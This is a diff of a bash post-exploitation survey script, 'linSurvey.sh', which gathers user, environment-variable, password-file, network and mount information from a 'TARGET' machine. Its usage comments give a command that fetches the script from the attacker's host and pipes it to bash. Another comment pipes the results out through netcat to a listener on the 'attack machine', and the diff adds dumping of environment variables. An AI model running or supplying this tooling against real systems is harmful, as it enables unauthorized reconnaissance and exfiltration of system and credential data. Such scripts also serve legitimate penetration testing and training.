@@ -1,6 +1,6 @@
 #! /bin/bash
 # Scripted by BashSTuff 
-# Ver1.0
+# Ver1.5
 ##############################################################################################
 ###                         GNU/Linux Survey Script                                        ###
 ##############################################################################################
@@ -15,11 +15,16 @@
 #	a) OPTIONAL: bash linSurvey.sh|tee /tmp/linSurvey.txt (two files on TARGET)
 #
 # 2) On TARGET machine: wget YOUR_IP_ADDR/linSurvey.sh -O-|bash  (You'll need a python HTTP server on your attack machine: python3 -m http.server 80)
-#	a) OPTIONAL: wget YOUR_IP_ADDR/linSurvey.sh -O-|bash|nc -nvvq1 YOUR_IP_ADDR YOUR_PORT  (saves a file on your attack machine only)
-#		i) Have a netcat listener on your attack machine BEFORE: nc -nvvls YOUR_IP_ADDR -p YOUR_PORT > linSurvey.txt && cat linSurvey.txt
+#	a) OPTIONAL: wget YOUR_IP_ADDR/linSurvey.sh -O-|bash|nc -nvvq1 YOUR_IP_ADDR YOUR_PORT  (You'll need a netcat listener on  your attack machine: nc -nvvls YOUR_IP_ADDR -p YOUR_PORT > linSurvey.txt && cat linSurvey.txt)
+#
 ##
 
 
+COLORS="`/usr/bin/env|grep -i term`"
+if [ -z $COLORS ]; then
+	TERM=xterm-256color
+	export TERM
+fi
 BLACK="\033[30m"
 RED="\033[31m"
 GREEN="\033[32m"
@@ -67,9 +72,11 @@ printf "$NORMAL"
 SUBSECTION="Users, Schedule Tasks, and Logon Information"
 SECTION_BANNER
 
-
 printf "$GREEN Curent User and Groups: $NORMAL \n"
 /usr/bin/id
+printf "\n"
+printf "$GREEN User environment variables: $NORMAL \n"
+/usr/bin/env
 printf "\n"
 printf "$GREEN Password file: $NORMAL \n"
 $CAT /etc/passwd
@@ -120,6 +127,7 @@ printf "$GREEN kernel informaiton: $NORMAL \n"
 $CAT /proc/version
 printf "\n"
 
+
 ## Network info ##
 SUBSECTION="Networking Information"
 SECTION_BANNER
@@ -135,13 +143,13 @@ printf "$GREEN DNS resolver(s) informaiton: $NORMAL \n"
 $CAT /etc/resolv.conf|grep -i nameserver
 printf "\n"
 printf "$GREEN Network Interfaces: $NORMAL \n"
-/sbin/ifconfig -a
+/sbin/ifconfig -a 2>/dev/null || /bin/ip a
 printf "\n"
 printf "$GREEN Gateway and Routes: $NORMAL \n"
-/sbin/route
+/sbin/route -n 2>/dev/null || /bin/netstat -rn 2>/dev/null || /bin/ip r |column -t
 printf "\n"
 printf "$GREEN Current Socket Statics: $NORMAL \n"
-/bin/netstat -taunpo
+/bin/ss -taunpo 2>/dev/null || /bin/netstat -taunpo
 printf "\n"
 
 
@@ -161,7 +169,6 @@ printf "\n"
 printf "$GREEN Mount Information: $NORMAL \n"
 /bin/mount | column -t
 printf "\n"
-
 
 
 ## files, folders, and perms ## 
